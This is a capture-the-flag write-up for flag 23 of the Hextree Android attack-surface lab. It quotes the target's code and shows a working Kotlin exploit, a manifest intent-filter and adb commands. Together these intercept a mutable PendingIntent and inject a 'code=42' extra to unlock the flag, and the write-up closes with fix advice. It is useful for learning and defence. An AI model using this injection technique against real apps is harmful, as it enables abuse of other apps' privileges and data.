# Flag 23 — Injecting Data via a Mutable PendingIntent

**Vulnerability category:** PendingIntent misuse
**Target component:** `io.hextree.attacksurface.activities.Flag23Activity`

---

## Target

This flag flips the direction of [flag 22](../flag-22): instead of the attacker creating the `PendingIntent`, `Flag23Activity` creates one of its own and hands it out via an implicit broadcast, expecting it to simply be fired later as a trigger:

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    String action = intent.getAction();
    if (action == null) {
        Intent intent2 = new Intent("io.hextree.attacksurface.GIVE_FLAG");
        intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName());
        PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432);

        Intent intent3 = new Intent("io.hextree.attacksurface.MUTATE_ME");
        intent3.addFlags(8);
        intent3.putExtra("pending_intent", activity);
        startActivity(intent3);
        return;
    }
    if (action.equals("io.hextree.attacksurface.GIVE_FLAG")) {
        if (intent.getIntExtra("code", -1) == 42) {
            success(this);
        } else {
            Toast.makeText(this, "Condition not met for flag", 0).show();
        }
    }
}
```

The flag value `33554432` passed to `PendingIntent.getActivity()` is `0x02000000` — `PendingIntent.FLAG_MUTABLE`. So `Flag23Activity` itself creates a **mutable** `PendingIntent` whose base `Intent` is explicitly addressed back to itself (`Flag23Activity`, action `GIVE_FLAG`), then broadcasts that `PendingIntent` via the implicit `MUTATE_ME` action for anyone to pick up.

## Vulnerability

A `PendingIntent` created with `FLAG_MUTABLE` allows whoever ends up calling `.send()` on it to supply a **fill-in `Intent`**, whose extras get merged into (and can override) the original `Intent` the `PendingIntent` wraps, before it's actually delivered to its real destination. This is meant for legitimate use cases (e.g. a notification action that needs some per-send customization), but it means that **whoever receives the `PendingIntent` gets partial control over the data that will eventually reach the `PendingIntent`'s original target** — not just the ability to trigger it.

Here, `Flag23Activity` hands out a mutable `PendingIntent` to an untrusted recipient. The recipient (our app) doesn't need to know or care what the `PendingIntent` ultimately points to — it just needs to call `.send()` with a crafted fill-in `Intent`, injecting whatever extra the real destination's logic checks for.

## Approach

Our `CatcherActivity`, registered for both `io.hextree.attacksurface.ATTACK_ME` and `io.hextree.attacksurface.MUTATE_ME` (so it can be resolved for either flag's implicit intent), handles the mutable-`PendingIntent` case:

```kotlin
val pi = intent.getParcelableExtra<PendingIntent>("pending_intent")
if (pi != null) {
    val fillIn = Intent().apply { putExtra("code", 42) }
    pi.send(this, 0, fillIn)
    Log.i(TAG, "Injected code=42 and relayed the mutable PendingIntent")
    return
}
```

Steps:

1. Register `CatcherActivity` with an `<intent-filter>` matching `io.hextree.attacksurface.MUTATE_ME`:

```xml
<activity android:name=".CatcherActivity" android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <action android:name="io.hextree.attacksurface.MUTATE_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

2. Launch `Flag23Activity` directly so it creates and dispatches its mutable `PendingIntent` (via implicit resolution, just like flags 10–12):

```bash
./gradlew installDebug
adb shell am force-stop io.hextree.attacksurface
adb shell am start -n io.hextree.attacksurface/.activities.Flag23Activity
```

3. When our `CatcherActivity` receives the `pending_intent` extra, it builds a fill-in `Intent` carrying `code = 42` and calls `pi.send(this, 0, fillIn)`. Because the `PendingIntent` is mutable, this extra is merged into its base `Intent` (action `GIVE_FLAG`, explicitly addressed back to `Flag23Activity`) before delivery. The result: `Flag23Activity` receives an intent with `action == "io.hextree.attacksurface.GIVE_FLAG"` and `code == 42`, satisfies its own check, and releases the flag.

See [`exploit/CatcherActivity.kt`](./exploit/CatcherActivity.kt) for the full handler (shared with flag 22's catcher, dispatching on whether a `pending_intent` extra is present).

## Why it works

Handing out a mutable `PendingIntent` to an untrusted component is equivalent to giving that component a limited, but real, ability to shape a future `Intent` that will be delivered on the issuing app's behalf. `Flag23Activity` trusts that whoever it hands the `PendingIntent` to will only use it as a simple trigger, but mutability means the recipient can also smuggle in extras that the final destination's logic may treat as legitimate, internally-sourced data.

## Fix

- Default to `FLAG_IMMUTABLE` for any `PendingIntent` handed to a component outside your own trust boundary (this has been the Android-recommended default since API 23, and is required on API 31+ unless explicitly opted out). Only use `FLAG_MUTABLE` when the fill-in mechanism is genuinely needed and the recipient is trusted.
- If a mutable `PendingIntent` must be shared with an external component, treat any data that later arrives through it — including the "own" extras — as untrusted, exactly as if it came from an external caller directly.
- Don't rely on a single scalar extra (`code == 42`) as an internal authorization signal if it can be injected this way — validate meaningful state server-side or through a channel the recipient of the `PendingIntent` cannot influence.
